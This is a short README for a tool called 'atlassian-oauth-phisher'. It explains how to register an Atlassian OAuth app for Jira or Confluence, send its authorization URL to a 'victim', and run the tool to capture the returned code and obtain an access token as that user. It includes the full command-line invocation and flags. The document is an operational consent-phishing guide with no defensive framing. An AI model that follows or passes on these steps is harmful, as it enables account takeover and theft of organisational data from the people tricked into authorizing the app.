# Atlassian OAuth Phisher

Got an Atlassian OAuth app for JIRA or Confluence? What happens if someone authorizes the app?

You'll want a valid Lets Encrypt certificate

**Pre-req**
1. Create an Atlassian OAuth app (will work for JIRA or Confluence)
  1. Record your ClientID, Client Secret, Redirect URI, and Classic Authorization URL
  2. Send the Classic authorization URL to the victim
  3. Run `atlassian-oauth-phisher` to recieve the code and obtain an auth token as the user

## Usage

```
atlassian-oauth-phisher \
  -c /etc/letsencrypt/live/example.com/fullchain.pem \ 
  -k /etc/letsencrypt/live/example.com/privkey.pem \
  -client-id [clientid] \
  -client-secret "[secret]" \
  -redirect-uri "[thishost]/callback"

Usage of ./main:
  -c string
        path to cert file
  -client-id string
        Atlassian ClientID
  -client-secret string
        Atlassian Client Secret
  -k string
        path to key file
  -port string
        port to serve on (default "443")
  -redirect-uri string
        Atlassian Redirect URL
```
